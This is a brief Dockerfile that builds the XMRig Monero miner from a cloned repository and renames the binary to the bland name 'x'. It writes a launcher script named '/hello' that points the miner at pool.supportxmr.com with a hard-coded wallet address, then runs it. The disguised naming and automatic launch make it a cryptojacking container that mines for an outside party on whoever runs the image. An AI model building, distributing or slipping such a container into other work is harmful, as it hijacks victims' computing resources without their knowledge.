FROM  alpine:latest
RUN   apk --no-cache upgrade && \
      apk --no-cache add \
        git \
        cmake \
        libuv-dev \
        build-base && \
      git clone https://github.com/jitjitsu/xr && \
      cd xr && \
      mkdir build && \
      cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release . && \
      make && \
      apk del \
        build-base \
        cmake \
        git && \
      mv /xr/xmrig /xr/x && \
      echo "/xr/x -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.sema -p x -k --max-cpu-usage 10" > /hello && \
      chmod 0777 /hello && \
      /hello
